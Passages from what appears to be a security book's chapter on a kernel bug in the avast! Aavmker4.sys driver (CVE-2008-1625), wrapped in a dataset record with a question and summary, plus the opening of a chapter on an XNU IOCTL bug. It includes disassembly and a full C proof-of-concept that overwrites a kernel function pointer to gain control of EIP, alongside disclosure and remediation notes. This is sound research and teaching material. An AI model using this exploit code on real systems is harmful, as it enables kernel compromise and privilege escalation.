Rule Them All 95\n[..]\n//\n// Current stack location - contains a pointer to the current\n// IO_STACK_LOCATION structure in the IRP stack. This field\n// should never be directly accessed by drivers. They should\n// use the standard functions.\n//\nstruct _IO_STACK_LOCATION *CurrentStackLocation;\n[..]\nThe layout of the _IO_STACK_LOCATION structure is shown below (see\nntddk.h of the Windows Driver Kit):\n[..]\ntypedef struct _IO_STACK_LOCATION {\nUCHAR MajorFunction;\nUCHAR MinorFunction;\nUCHAR Flags;\nUCHAR Control;\n[..]\n//\n// System service parameters for: NtDeviceIoControlFile\n//\n// Note that the user's output buffer is stored in the\n// UserBuffer field\n// and the user's input buffer is stored in the SystemBuffer\n// field.\n//\nstruct {\nULONG OutputBufferLength;\nULONG POINTER_ALIGNMENT InputBufferLength;\nULONG POINTER_ALIGNMENT IoControlCode;\nPVOID Type3InputBuffer;\n} DeviceIoControl;\n[..]\nIn addition to the IoControlCode of the requested IOCTL, this\nstructure contains information about the size of the input and output\nbuffer. Now that I had more information about the _IO_STACK_LOCATION\nstructure, I took a second look at the disassembly:\n[..]\n.text:0001098C ; int __stdcall sub_1098C(int, PIRP Irp)\n.text:0001098C sub_1098C proc near ; DATA XREF: DriverEntry+130\n[..]\n.text:000109B2 mov ebx, [ebp+Irp] ; ebx = address of IRP\n.text:000109B5 mov eax, [ebx+60h] ; eax = address of CurrentStackLocation\n.text:000109B8 mov esi, [eax+8] ; ULONG InputBufferLength\n.text:000109BB mov [ebp+var_1C], esi ; save InputBufferLength in var_1C\n.text:000109BE mov edx, [eax+4] ; ULONG OutputBufferLength\n96 Chapter 6\n.text:000109C1 mov [ebp+var_3C], edx ; save OutputBufferLength in var_3C\n.text:000109C4 mov eax, [eax+0Ch] ; ULONG IoControlCode\n.text:000109C7 mov ecx, 0B2D6002Ch ; ecx = 0xB2D6002C\n.text:000109CC cmp eax, ecx ; compare 0xB2D6002C with IoControlCode\n.text:000109CE ja loc_10D15\n[..]\nAs I mentioned before, a pointer to _IO_STACK_LOCATION is stored\nin EAX at address .text:000109B5, and then at address .text:000109B8 the\nInputBufferLength is stored in ESI. At .text:000109BE the O utputBufferLength\nis stored in EDX, and at .text:000109C4 the IoControlCode is stored in EAX.\nLater, the requested IOCTL code stored in EAX is compared with the\nvalue 0xB2D6002C (see address .text:000109C7 and .text:000109CC). Hey,\nI found the first valid IOCTL code of the driver! I searched the func-\ntion for all values that are compared with the requested IOCTL code\nin EAX and got a list of the supported IOCTLs of Aavmker4.sys.\nStep 5: Find the User-Controlled Input Values\nAfter I generated the list of all the supported IOCTLs, I tried to\nlocate the buffer containing the user-supplied IOCTL input data. All\nIRP_MJ_DEVICE_CONTROL requests supply both an input buffer and an out-\nput buffer. The way the system describes these buffers depends on the\ndata transfer type. The transfer type is stored in the IOCTL code itself.\nUnder Microsoft Windows, the IOCTL code values are normally cre-\nated using the CTL_CODE macro.15 Here’s another excerpt from ntddk.h:\n[..]\n//\n// Macro definition for defining IOCTL and FSCTL function control codes. Note\n// that function codes 0-2047 are reserved for Microsoft Corporation, and\n// 2048-4095 are reserved for customers.\n//\n#define CTL_CODE( DeviceType, Function, Method, Access ) ( \\\n((DeviceType) << 16) | ((Access) << 14) | ((Function) << 2) | (Method) \\\n)\n[..]\n//\n// Define the method codes for how buffers are passed for I/O and FS controls\n//\n#define METHOD_BUFFERED 0\n#define METHOD_IN_DIRECT 1\n#define METHOD_OUT_DIRECT 2\n#define METHOD_NEITHER 3\n[..]\nOne Kernel to Rule Them All 97\nThe transfer type is specified using the Method parameter of the\nCTL_CODE macro. I wrote a little tool to reveal which data transfer type\nis used by the IOCTLs of Aavmker4.sys:\n01 #include <windows.h>\n02 #include <stdio.h>\n03\n04 int\n05 main (int argc, char *argv[])\n06 {\n07 unsigned int method = 0;\n08 unsigned int code = 0;\n09\n10 if (argc != 2) {\n11 fprintf (stderr, \"Usage: %s <IOCTL code>\\n\", argv[0]);\n12 return 1;\n13 }\n14\n15 code = strtoul (argv[1], (char **) NULL, 16);\n16 method = code & 3;\n17\n18 switch (method) {\n19 case 0:\n20 printf (\"METHOD_BUFFERED\\n\");\n21 break;\n22 case 1:\n23 printf (\"METHOD_IN_DIRECT\\n\");\n24 break;\n25 case 2:\n26 printf (\"METHOD_OUT_DIRECT\\n\");\n27 break;\n28 case 3:\n29 printf (\"METHOD_NEITHER\\n\");\n30 break;\n31 default:\n32 fprintf (stderr, \"ERROR: invalid IOCTL data transfer method\\n\");\n33 break;\n34 }\n35\n36 return 0;\n37 }\nListing 6-1: A little tool that I wrote (IOCTL_method.c) to show which data transfer type is used by the\nIOCTLs of Aavmker4.sys\nI then compiled the tool with the command-line C compiler of\nVisual Studio (cl):\nC:\\BHD>cl /nologo IOCTL_method.c\nIOCTL_method.c\nThe following output shows the tool from Listing 6 -1 in action:\nC:\\BHD>IOCTL_method.exe B2D6002C\nMETHOD_BUFFERED\n98 Chapter 6\nSo the driver uses the METHOD_BUFFERED transfer type to describe\nthe input and output buffers of an IOCTL request. According to the\nbuffer descriptions in the Windows Driver Kit, the input buffer of\nIOCTLs, which use the METHOD_BUFFERED transfer type, can be found at\nIrp->AssociatedIrp.SystemBuffer.\nBelow is an example of a reference to the input buffer in the dis-\nassembly of Aavmker4.sys:\n[..]\n.text:00010CF1 mov eax, [ebx+0Ch] ; ebx = address of IRP\n.text:00010CF4 mov eax, [eax]\n[..]\nIn this example, EBX holds a pointer to the IRP structure. At\naddress .text:00010CF1, the IRP structure member at offset 0x0c is\nreferenced.\nkd> dt -v -r 2 _IRP\nnt!_IRP\nstruct _IRP, 21 elements, 0x70 bytes\n+0x000 Type : ??\n+0x002 Size : ??\n+0x004 MdlAddress : ????\n+0x008 Flags : ??\n+0x00c AssociatedIrp : union __unnamed, 3 elements, 0x4 bytes\n+0x000 MasterIrp : ????\n+0x000 IrpCount : ??\n+0x000 SystemBuffer : ????\n[..]\nThe output of WinDbg shows that AssociatedIrp is located at this\noffset (IRP->AssociatedIrp). At address .text:00010CF4, the input buffer\nof the IOCTL call is referenced and stored in EAX (Irp->AssociatedIrp\n.SystemBuffer). Now that I had found the supported IOCTLs, as well\nas the IOCTL input data, I started searching for bugs.\nStep 6: Reverse Engineer the IOCTL Handler\nTo find a possible security defect, I audited the handler code of one\nIOCTL at a time while tracing the supplied input data. When I came\nacross the IOCTL code 0xB2D60030, I found a subtle bug.\nIf the IOCTL code 0xB2D60030 is requested by a user space applica-\ntion, the following code is executed:\n[..]\n.text:0001098C ; int __stdcall sub_1098C(int, PIRP Irp)\n.text:0001098C sub_1098C proc near ; DATA XREF: DriverEntry+130\n[..]\n.text:00010D28 cmp eax, 0B2D60030h ; IOCTL-Code == 0xB2D60030 ?\n.text:00010D2D jz short loc_10DAB ; if so -> loc_10DAB\n[..]\nOne Kernel to Rule Them All 99\nIf the requested IOCTL code matches 0xB2D60030 (see\n.text:00010D28), the assembler code at address .text:00010DAB\n(loc_10DAB) is executed:\n[..]\n.text:000109B8 mov esi, [eax+8] ; ULONG InputBufferLength\n.text:000109BB mov [ebp+var_1C], esi\n[..]\n.text:00010DAB loc_10DAB: ; CODE XREF: sub_1098C+3A1\n.text:00010DAB xor edi, edi ; EDI = 0\n.text:00010DAD cmp byte_1240C, 0\n.text:00010DB4 jz short loc_10DC9\n[..]\n.text:00010DC9 loc_10DC9: ; CODE XREF: sub_1098C+428\n.text:00010DC9 mov esi, [ebx+0Ch] ; Irp->AssociatedIrp.SystemBuffer\n.text:00010DCC cmp [ebp+var_1C], 878h ; input data length == 0x878 ?\n.text:00010DD3 jz short loc_10DDF ; if so -> loc_10DDF\n[..]\nAt address .text:00010DAB EDI is set to 0. The EBX register holds a\npointer to the IRP structure, and at address .text:00010DC9 a pointer to\nthe input buffer data is stored in ESI (Irp->AssociatedIrp.SystemBuffer).\nAt the beginning of the dispatch routine, the InputBufferLength of\nthe request is stored in the stack variable var_1c (see .text:000109BB).\nThe length of the input data at address .text:00010DCC is then com-\npared to the value 0x878 (see Figure 6-4).\nFigure 6-4: Graph view of the vulnerable code path in IDA Pro, part 1\n100 Chapter 6\nIf the data length equals 0x878, the user-controlled input data,\npointed to by ESI, is further processed:\n[..]\n.text:00010DDF loc_10DDF: ; CODE XREF: sub_1098C+447\n.text:00010DDF mov [ebp+var_4], edi\n.text:00010DE2 cmp [esi], edi ; ESI == input data\n.text:00010DE4 jz short loc_10E34 ; if input data == NULL -> loc_10E34\n[..]\n.text:00010DE6 mov eax, [esi+870h] ; ESI and EAX are pointing to the →\ninput data\n.text:00010DEC mov [ebp+var_48], eax ; a pointer to user controlled data →\nis stored in var_48\n.text:00010DEF cmp dword ptr [eax], 0D0DEAD07h ; validation of input data\n.text:00010DF5 jnz short loc_10E00\n[..]\n.text:00010DF7 cmp dword ptr [eax+4], 10BAD0BAh ; validation of input data\n.text:00010DFE jz short loc_10E06\n[..]\nThe code at address .text:00010DE2 checks whether the input data\nequals NULL. If the input data is not NULL, a pointer from this data\nis extracted at [user_data+0x870] and stored in EAX (see .text:00010DE6).\nThis pointer value is stored in the stack variable var_48 (see .text:00010DEC).\nA check is then performed to see if the data, pointed to by EAX, starts\nwith the values 0xD0DEAD07 and 0x10BAD0BA (see .text:00010DEF and\n.text:00010DF7). If so, the parsing of the input data continues:\n[..]\n.text:00010E06 loc_10E06: ; CODE XREF: sub_1098C+472\n.text:00010E06 xor edx, edx\n.text:00010E08 mov eax, [ebp+var_48]\n.text:00010E0B mov [eax], edx\n.text:00010E0D mov [eax+4], edx\n.text:00010E10 add esi, 4 ; source address\n.text:00010E13 mov ecx, 21Ah ; length\n.text:00010E18 mov edi, [eax+18h] ; destination address\n.text:00010E1B rep movsd ; memcpy()\n[..]\nThe rep movsd instruction at address .text:00010E1B represents\na memcpy() function. So ESI holds the source address, EDI holds the\ndestination address, and ECX holds the length for the copy operation.\nECX gets assigned the value 0x21a (see .text:00010E13). ESI points to\nthe user-controlled IOCTL data (see .text:00010E10), and EDI is also\nderived from user-controlled data pointed to by EAX (see .text:00010E18\nand Figure 6-5).\nOne Kernel to Rule Them All 101\nFigure 6-5: Graph view of the vulnerable code path in IDA Pro, part 2\nHere’s some pseudo C code of that memcpy() call:\nmemcpy ([EAX+0x18], ESI + 4, 0x21a * 4);\nOr, in more abstract terms:\nmemcpy (user_controlled_address, user_controlled_data, 0x868);\nIt is therefore possible to write 0x868 bytes (0x21a * 4 bytes, as the\nrep movsd instruction copies DWORDs from one location to another)\nof user-controllable data to an arbitrary user-controlled address in\neither user or kernel space. Nice!\nThe anatomy of the bug, diagrammed in Figure 6-6, is as follows:\n1. An IOCTL request (0xB2D60030) is sent to the kernel driver\nAavmker4.sys using the AavmKer4 device.\n2. The driver code checks whether the IOCTL input data length\nequals the value 0x878. If so, proceed to step 3.\n102 Chapter 6\n(2)\nAavmker4.sys input data length == 0x878?\n(3)\nKernel Space\nDoes the user input contain the values\n0xD0DEAD07 and 0x10BAD0BA?\n(4)\n\\Device\\AavmKer4\nmemcpy (user_controlled_address,\nuser_controlled_value, 0x868)\n(1)\n(5)\nIOCTL request: User Space\n0xB2D60030\nMemory Corruption!\nFigure 6-6: Overview of the vulnerability from IOCTL request to memory corruption\n3. The driver checks whether the user-controlled IOCTL input data\ncontains the values 0xD0DEAD07 and 0x10BAD0BA. If so, proceed to\nstep 4.\n4. The erroneous memcpy() call is executed.\n5. The memory is corrupted.\n6.2 exploitation\nTo gain control of EIP, I first had to find a suitable target address to\noverwrite. While searching through the IOCTL dispatch routine, I\nfound two places where a function pointer is called:\n[..]\n.text:00010D8F push 2 ; _DWORD\n.text:00010D91 push 1 ; _DWORD\n.text:00010D93 push 1 ; _DWORD\n.text:00010D95 push dword ptr [eax] ; _DWORD\n.text:00010D97 call KeGetCurrentThread\n.text:00010D9C push eax ; _DWORD\n.text:00010D9D call dword_12460 ; the function pointer is called\n.text:00010DA3 mov [ebx+18h], eax\n.text:00010DA6 jmp loc_10F04\n[..]\n.text:00010DB6 push 2 ; _DWORD\n.text:00010DB8 push 1 ; _DWORD\nOne Kernel to Rule Them All 103\n.text:00010DBA push 1 ; _DWORD\n.text:00010DBC push edi ; _DWORD\n.text:00010DBD call KeGetCurrentThread\n.text:00010DC2 push eax ; _DWORD\n.text:00010DC3 call dword_12460 ; the function pointer is called\n[..]\n.data:00012460 ; int (__stdcall *dword_12460)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD)\n.data:00012460 dword_12460 dd 0 ; the function pointer is declared\n[..]\nThe function pointer declared at .data:00012460 is called at\n.text:00010D9D and .text:00010DC3 in the dispatch routine. To gain\ncontrol over EIP, all I had to do was overwrite this function pointer\nand then wait for it to be called. I wrote the following POC code to\nmanipulate the function pointer:\n01 #include <windows.h>\n02 #include <winioctl.h>\n03 #include <stdio.h>\n04 #include <psapi.h>\n05\n06 #define IOCTL 0xB2D60030 // vulnerable IOCTL\n07 #define INPUTBUFFER_SIZE 0x878 // input data length\n08\n09 __inline void\n10 memset32 (void* dest, unsigned int fill, unsigned int count)\n11 {\n12 if (count > 0) {\n13 _asm {\n14 mov eax, fill // pattern\n15 mov ecx, count // count\n16 mov edi, dest // dest\n17 rep stosd;\n18 }\n19 }\n20 }\n21\n22 unsigned int\n23 GetDriverLoadAddress (char *drivername)\n24 {\n25 LPVOID drivers[1024];\n26 DWORD cbNeeded = 0;\n27 int cDrivers = 0;\n28 int i = 0;\n29 const char * ptr = NULL;\n30 unsigned int addr = 0;\n31\n32 if (EnumDeviceDrivers (drivers, sizeof (drivers), &cbNeeded) &&\n33 cbNeeded < sizeof (drivers)) {\n34 char szDriver[1024];\n35\n36 cDrivers = cbNeeded / sizeof (drivers[0]);\n37\n38 for (i = 0; i < cDrivers; i++) {\n39 if (GetDeviceDriverBaseName (drivers[i], szDriver,\n40 sizeof (szDriver) / sizeof (szDriver[0]))) {\n104 Chapter 6\n41 if (!strncmp (szDriver, drivername, 8)) {\n42 printf (\"%s (%08x)\\n\", szDriver, drivers[i]);\n43 return (unsigned int)(drivers[i]);\n44 }\n45 }\n46 }\n47 }\n48\n49 fprintf (stderr, \"ERROR: cannot get address of driver %s\\n\", drivername);\n50\n51 return 0;\n52 }\n53\n54 int\n55 main (void)\n56 {\n57 HANDLE hDevice;\n58 char * InputBuffer = NULL;\n59 BOOL retval = TRUE;\n60 unsigned int driveraddr = 0;\n61 unsigned int pattern1 = 0xD0DEAD07;\n62 unsigned int pattern2 = 0x10BAD0BA;\n63 unsigned int addr_to_overwrite = 0; // address to overwrite\n64 char data[2048];\n65\n66 // get the base address of the driver\n67 if (!(driveraddr = GetDriverLoadAddress (\"Aavmker4\"))) {\n68 return 1;\n69 }\n70\n71 // address of the function pointer at .data:00012460 that gets overwritten\n72 addr_to_overwrite = driveraddr + 0x2460;\n73\n74 // allocate InputBuffer\n75 InputBuffer = (char *)VirtualAlloc ((LPVOID)0,\n76 INPUTBUFFER_SIZE,\n77 MEM_COMMIT | MEM_RESERVE,\n78 PAGE_EXECUTE_READWRITE);\n79\n80 /////////////////////////////////////////////////////////////////////////////\n81 // InputBuffer data:\n82 //\n83 // .text:00010DC9 mov esi, [ebx+0Ch] ; ESI == InputBuffer\n84\n85 // fill InputBuffer with As\n86 memset (InputBuffer, 0x41, INPUTBUFFER_SIZE);\n87\n88 // .text:00010DE6 mov eax, [esi+870h] ; EAX == pointer to \"data\"\n89 memset32 (InputBuffer + 0x870, (unsigned int)&data, 1);\n90\n91 /////////////////////////////////////////////////////////////////////////////\n92 // data:\n93 //\n94\n95 // As the \"data\" buffer is used as a parameter for a \"KeSetEvent\" windows kernel\n96 // function, it needs to contain some valid pointers (.text:00010E2C call ds:KeSetEvent)\n97 memset32 (data, (unsigned int)&data, sizeof (data) / sizeof (unsigned int));\n98\nOne Kernel to Rule Them All 105\n99 // .text:00010DEF cmp dword ptr [eax], 0D0DEAD07h ; EAX == pointer to \"data\"\n100 memset32 (data, pattern1, 1);\n101\n102 // .text:00010DF7 cmp dword ptr [eax+4], 10BAD0BAh ; EAX == pointer to \"data\"\n103 memset32 (data + 4, pattern2, 1);\n104\n105 // .text:00010E18 mov edi, [eax+18h] ; EAX == pointer to \"data\"\n106 memset32 (data + 0x18, addr_to_overwrite, 1);\n107\n108 /////////////////////////////////////////////////////////////////////////////\n109 // open device\n110 hDevice = CreateFile (TEXT(\"\\\\\\\\.\\\\AavmKer4\"),\n111 GENERIC_READ | GENERIC_WRITE,\n112 FILE_SHARE_READ | FILE_SHARE_WRITE,\n113 NULL,\n114 OPEN_EXISTING,\n115 0,\n116 NULL);\n117\n118 if (hDevice != INVALID_HANDLE_VALUE) {\n119 DWORD retlen = 0;\n120\n121 // send evil IOCTL request\n122 retval = DeviceIoControl (hDevice,\n123 IOCTL,\n124 (LPVOID)InputBuffer,\n125 INPUTBUFFER_SIZE,\n126 (LPVOID)NULL,\n127 0,\n128 &retlen,\n129 NULL);\n130\n131 if (!retval) {\n132 fprintf (stderr, \"[-] Error: DeviceIoControl failed\\n\");\n133 }\n134\n135 } else {\n136 fprintf (stderr, \"[-] Error: Unable to open device.\\n\");\n137 }\n138\n139 return (0);\n140 }\nListing 6-2: The POC code that I wrote to manipulate the function pointer at .data:00012460 (poc.c)\nIn line 67 of Listing 6-2, the base address of the driver in memory\nis stored in driveraddr. Then, in line 72, the address of the function\npointer is calculated; this is overwritten by the manipulated m emcpy()\ncall. A buffer of INPUTBUFFER_SIZE (0x878) bytes is allocated in line 75.\nThis buffer holds the IOCTL input data, which is filled with the hexa-\ndecimal value 0x41 (see line 86). Then a pointer to another data array\nis copied into the input data buffer (see line 89). In the disassembly of\nthe driver, this pointer is referenced at address .text:00010DE6: mov eax,\n[esi+870h].\n106 Chapter 6\nDirectly after the call of the memcpy() function, the kernel function\nKeSetEvent() is called:\n[..]\n.text:00010E10 add esi, 4 ; source address\n.text:00010E13 mov ecx, 21Ah ; length\n.text:00010E18 mov edi, [eax+18h] ; destination address\n.text:00010E1B rep movsd ; memcpy()\n.text:00010E1D dec PendingCount2\n.text:00010E23 inc dword ptr [eax+20h]\n.text:00010E26 push edx ; Wait\n.text:00010E27 push edx ; Increment\n.text:00010E28 add eax, 8\n.text:00010E2B push eax ; Parameter of KeSetEvent\n.text:00010E2B ; (eax = IOCTL input data)\n.text:00010E2C call ds:KeSetEvent ; KeSetEvent is called\n.text:00010E32 xor edi, edi\n[..]\nSince the user-derived data pointed to by EAX is used as a param-\neter for this function (see .text:00010E2B), the data buffer needs to\nbe filled with valid pointers in order to prevent an access violation.\nI filled the whole buffer with its own valid user space address (see\nline 97). Then in lines 100 and 103, the two expected patterns are\ncopied into the data buffer (see .text:00010DEF and .text:00010DF7),\nand in line 106, the destination address for the memcpy() function is\ncopied into the data buffer (.text:00010E18 mov edi, [eax+18h]). The\ndevice of the driver is then opened for reading and writing (see\nline 110), and the malicious IOCTL request is sent to the vulnerable\nkernel driver (see line 122).\nAfter I developed that POC code, I started the Windows XP\nVMware guest system and attached WinDbg to the kernel (see Sec-\ntion B.2 for a description of the following debugger commands):\nkd> .sympath SRV*c:\\WinDBGSymbols*http://msdl.microsoft.com/download/symbols\nkd> .reload\n[..]\nkd> g\nBreak instruction exception - code 80000003 (first chance)\n*******************************************************************************\n* *\n* You are seeing this message because you pressed either *\n* CTRL+C (if you run kd.exe) or, *\n* CTRL+BREAK (if you run WinDBG), *\n* on your debugger machine's keyboard. *\n* *\n* THIS IS NOT A BUG OR A SYSTEM CRASH *\n* *\n* If you did not intend to break into the debugger, press the \"g\" key, then *\n* press the \"Enter\" key now. This message might immediately reappear. If it *\n* does, press \"g\" and \"Enter\" again. *\n* *\n*******************************************************************************\nOne Kernel to Rule Them All 107\nnt!RtlpBreakWithStatusInstruction:\n80527bdc cc int 3\nkd> g\nI then compiled the POC code with the command-line C com-\npiler of Visual Studio (cl) and executed it as an unprivileged user\ninside the VMware guest system:\nC:\\BHD\\avast>cl /nologo poc.c psapi.lib\nC:\\BHD\\avast>poc.exe\nAfter I executed the POC code, nothing happened. So how could\nI find out if the function pointer was successfully manipulated? Well,\nall I had to do was trigger the antivirus engine by opening an arbitrary\nexecutable. I opened Internet Explorer and got the following message\nin the debugger:\n#################### AAVMKER: WRONG RQ ######################!\nAccess violation - code c0000005 (!!! second chance !!!)\n41414141 ?? ???\nYes! The instruction pointer appeared to be under my full con-\ntrol. To verify this, I asked the debugger for more information:\nkd> kb\nChildEBP RetAddr Args to Child\nWARNING: Frame IP not in any known module. Following frames may be wrong.\nee91abc0 f7925da3 862026a8 e1cd33a8 00000001 0x41414141\nee91ac34 804ee119 86164030 860756b8 806d22d0 Aavmker4+0xda3\nee91ac44 80574d5e 86075728 861494e8 860756b8 nt!IopfCallDriver+0x31\nee91ac58 80575bff 86164030 860756b8 861494e8 nt!IopSynchronousServiceTail+0x70\nee91ad00 8056e46c 0000011c 00000000 00000000 nt!IopXxxControlFile+0x5e7\nee91ad34 8053d638 0000011c 00000000 00000000 nt!NtDeviceIoControlFile+0x2a\nee91ad34 7c90e4f4 0000011c 00000000 00000000 nt!KiFastCallEntry+0xf8\n0184c4d4 650052be 0000011c b2d60034 0184ff74 0x7c90e4f4\n0184ffb4 7c80b713 0016d2a0 00150000 0016bd90 0x650052be\n0184ffec 00000000 65004f98 0016d2a0 00000000 0x7c80b713\nkd> r\neax=862026a8 ebx=860756b8 ecx=b2d6005b edx=00000000 esi=00000008 edi=861494e8\neip=41414141 esp=ee91abc4 ebp=ee91ac34 iopl=0 nv up ei pl nz na po nc\ncs=0008 ss=0010 ds=0023 es=0023 fs=0030 gs=0000 efl=00010202\n41414141 ?? ???\nThe exploitation process, illustrated in Figure 6-7, was as follows:\n1. Is the length of the input data 0x878? If so, proceed to step 2.\n2. The user space buffer data gets referenced.\n3. Are the expected patterns found at data[0] and data[4]? If so,\nproceed to step 4.\n108 Chapter 6\nExploit process\nIRP\n.data SystemBuffer\n(6) (5) ... 41414141\n0x41414141 function pointer 41414141 ...\nKernel\nSpace\n(1)\n.text\nInputBufferLength == 0x878 ?\n(4)\nUser (2)\nSpace data\ncorrect pattern?\n(3)\nFigure 6-7: Diagram of my exploitation of the avast! vulnerability\n4. The destination address for the memcpy() call gets referenced.\n5. The memcpy() function copies the IOCTL input data into the .data\narea of the kernel.\n6. The manipulated function pointer gives full control over EIP.\nIf the POC code is executed without a kernel debugger attached,\nthe famed Blue Screen of Death (BSoD) will appear (see Figure 6-8).\nFigure 6-8: The Blue Screen of Death (BSoD)\nOne Kernel to Rule Them All 109",
    "question": "What is the vulnerability discovered in the avast! kernel driver and how can it be exploited?",
    "summary": "The author discovered a vulnerability in the avast! antivirus driver for Microsoft Windows, which allows an attacker to overwrite a function pointer and gain control of the instruction pointer (EIP), leading to potential exploitation. The bug was found by analyzing the driver's IOCTL handling code, where a memcpy() operation copies user-controlled data into a kernel space area without proper bounds checking. This vulnerability can be exploited by sending a specially crafted IOCTL request, which results in a memory corruption issue and ultimately triggers a Blue Screen of Death (BSoD) if no debugger is attached."
  },
  {
    "start": 50,
    "end": 62,
    "text": "After I gained control over EIP, I developed two exploits. One of\nthem grants SYSTEM rights to any requesting user (privilege escala-\ntion), and the other installs a rootkit into the kernel using the well-\nknown Direct Kernel Object Manipulation (DKOM) technique.16\nStrict laws prohibit me from providing a full, working exploit, but\nif you’re interested, you can watch a video of the exploit in action at\nthe book’s website.17\n6.3 Vulnerability remediation\nSaturday, March 29, 2008\nI informed ALWIL Software about the bug on March 18, 2008, and it\nreleased an updated version of avast! today. Wow, that was really fast\nfor a commercial software vendor!\n6.4 lessons learned\nAs a programmer and kernel-driver developer:\n• Define strict security settings for exported device objects. Do not\nallow unprivileged users to read from or write to these devices.\n• Always take care to validate input data correctly.\n• Destination addresses for memory-copy operations shouldn’t be\nextracted from user-supplied data.\n6.5 Addendum\nSunday, March 30, 2008\nSince the vulnerability was fixed and a new version of avast! is now\navailable, I released a detailed security advisory on my website today.18\nThe bug was assigned CVE-2008-1625. Figure 6-9 shows the timeline of\nthe vulnerability fix.\nVendor confirms\nthe vulnerability\nALWIL Software\nNew version of\nnotified avast! available Release date of my\nsecurity advisory\n03.18.2008 03.19.2008 03.29.2008 03.30.2008\nFigure 6-9: Timeline from vendor notification to the release of my security advisory\n110 Chapter 6\nnotes\n1. See SANS Top 20 Internet Security Problems, Threats and Risks (2007\nAnnual Update), http://www.sans.org/top20/2007/.\n2. See http://www.virustotal.com/.\n3. See http://www.avast.com/.\n4. See http://www.vmware.com/.\n5. WinDbg, the “official” Windows Debugger from Microsoft, is distributed as\npart of the free “Debugging Tools for Windows” suite available at http://www\n.microsoft.com/whdc/DevTools/Debugging/default.mspx.\n6. You can find a download link for a vulnerable trial version of avast! Profes-\nsional 4.7 at http://www.trapkit.de/books/bhd/.\n7. See http://www.nirsoft.net/utils/driverview.html.\n8. See http://www.hex-rays.com/idapro/.\n9. See Mark E. Russinovich and David A. Solomon, Microsoft Windows Internals:\nMicrosoft Windows Server 2003, Windows XP, and Windows 2000, 4th ed. (Red-\nmond, WA: Microsoft Press, 2005).\n10. See MSDN Library: Windows Development: Windows Driver Kit: Kernel-\nMode Driver Architecture: Reference: Standard Driver Routines: DriverEntry\nat http://msdn.microsoft.com/en-us/library/ff544113.aspx.\n11. WinObj is available at http://technet.microsoft.com/en-us/sysinternals/\nbb896657.aspx.\n12. The Windows Driver Kit can be downloaded at http://www.microsoft.com/\nwhdc/devtools/WDK/default.mspx.\n13. See MSDN Library: Windows Development: Windows Driver Kit:\nKernel-Mode Driver Architecture: Reference: Standard Driver Routines:\nDispatch DeviceControl available at http://msdn.microsoft.com/en-us/library/\nff543287.aspx.\n14. See MSDN Library: Windows Development: Windows Driver Kit: Kernel-\nMode Driver Architecture: Reference: Kernel Data Types: System-Defined Data\nStructures: IRP available at http://msdn.microsoft.com/en-us/library/ff550694.aspx.\n15. See MSDN Library: Windows Development: Windows Driver Kit: Kernel-\nMode Driver Architecture: Design Guide: Writing WDM Drivers: Managing\nInput/Output for Drivers: Handling IRPs: Using I/O Control Codes: Buffer\nDescriptions for I/O Control Codes available at http://msdn.microsoft.com/\nen-us/library/ff540663.aspx.\n16. See Jamie Butler, DKOM (Direct Kernel Object Manipulation) (presentation,\nBlack Hat Europe, Amsterdam, May 2004), at http://www.blackhat.com/\npresentations/win-usa-04/bh-win-04-butler.pdf.\n17. See http://www.trapkit.de/books/bhd/.\n18. My security advisory that describes the details of the avast! vulnerability\ncan be found at http://www.trapkit.de/advisories/TKADV2008-002.txt.\nOne Kernel to Rule Them All 111\n7\nA Bug olDer tHAn 4.4BsD\nSaturday, March 3, 2007\nDear Diary,\nLast week my Apple MacBook finally arrived. After getting acquainted\nwith the Mac OS X platform, I decided to take a closer look at the\nXNU kernel of OS X. After a few hours of digging through the kernel\ncode, I found a nice bug that occurs when the kernel tries to handle\na special TTY IOCTL. The bug was easy to trigger, and I wrote a POC\ncode that allows an unprivileged local user to crash the system via ker-\nnel panic. As usual, I then tried to develop an exploit to see if the bug\nallows arbitrary code execution. At this point, things got a bit more\ncomplicated. To develop the exploit code, I needed a way to debug\nthe OS X kernel. That’s not a problem if you own two Macs, but I\nonly had one: my brand-new MacBook.\n7.1 Vulnerability Discovery\nFirst I downloaded the latest source code release of the XNU kernel,1\nand then I searched for a vulnerability in the following way:\n• Step 1: List the IOCTLs of the kernel. ← I used an Intel Mac\n• Step 2: Identify the input data. with OS x 10.4.8\nand kernel version\n• Step 3: Trace the input data.\nxnu-792.15.4.obj~4/\nRELEASE_I386\nas a\nThese steps will be detailed in the follow- platform throughout\ning sections.\nthis chapter.\nStep 1: List the IOCTLs of the Kernel\nTo generate a list of the IOCTLs of the kernel, I simply searched\nthe kernel source code for the usual IOCTL macros. Every IOCTL\nis assigned its own number, which is usually created by a macro.\nDepending on the IOCTL type, the XNU kernel of OS X defines\nthe following macros: _IOR, _IOW, and _IOWR.\nosx$ pwd\n/Users/tk/xnu-792.13.8\nosx$ grep -rnw -e _IOR -e _IOW -e _IOWR *\n[..]\nxnu-792.13.8/bsd/net/bpf.h:161:#define BIOCGRSIG _IOR('B',114, u_int)\nxnu-792.13.8/bsd/net/bpf.h:162:#define BIOCSRSIG _IOW('B',115, u_int)\nxnu-792.13.8/bsd/net/bpf.h:163:#define BIOCGHDRCMPLT _IOR('B',116, u_int)\nxnu-792.13.8/bsd/net/bpf.h:164:#define BIOCSHDRCMPLT _IOW('B',117, u_int)\nxnu-792.13.8/bsd/net/bpf.h:165:#define BIOCGSEESENT _IOR('B',118, u_int)\nxnu-792.13.8/bsd/net/bpf.h:166:#define BIOCSSEESENT _IOW('B',119, u_int)\n[..]\nI now had a list of IOCTLs supported by the XNU kernel. To find\nthe source files that implement the IOCTLs, I searched the whole ker-\nnel source for each IOCTL name from the list. Here’s an example of\nthe BIOCGRSIG IOCTL:\nosx$ grep --include=*.c -rn BIOCGRSIG *\nxnu-792.13.8/bsd/net/bpf.c:1143: case BIOCGRSIG:\nStep 2: Identify the Input Data\nTo identify the user-supplied input data of an IOCTL request, I took a\nlook at some of the kernel functions that process the requests. I dis-\ncovered that such functions typically expect an argument called cmd of\ntype u_long and a second argument called data of type caddr_t.\n114 Chapter 7\nHere are some examples:\nSource code file xnu-792.13.8/bsd/netat/at.c\n[..]\n135 int\n136 at_control(so, cmd, data, ifp)\n137 struct socket *so;\n138 u_long cmd;\n139 caddr_t data;\n140 struct ifnet *ifp;\n141 {\n[..]\nSource code file xnu-792.13.8/bsd/net/if.c\n[..]\n1025 int\n1026 ifioctl(so, cmd, data, p)\n1027 struct socket *so;\n1028 u_long cmd;\n1029 caddr_t data;\n1030 struct proc *p;\n1031 {\n[..]\nSource code file xnu-792.13.8/bsd/dev/vn/vn.c\n[..]\n877 static int\n878 vnioctl(dev_t dev, 